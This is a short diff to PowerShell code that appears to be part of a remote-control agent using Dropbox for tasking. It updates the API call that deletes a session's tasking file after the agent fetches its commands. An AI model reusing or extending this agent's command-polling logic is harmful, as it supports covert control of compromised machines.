@@ -24,7 +24,7 @@ $Script:GetTask = {
                 # if there was a tasking data, remove it
                 $wc.Headers.Add("Content-Type", " application/json");
                 $wc.Headers.Remove("Dropbox-API-Arg");
-                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
+                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete_v2", "POST", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
                 $Data;
             }
             $Script:MissedCheckins = 0;
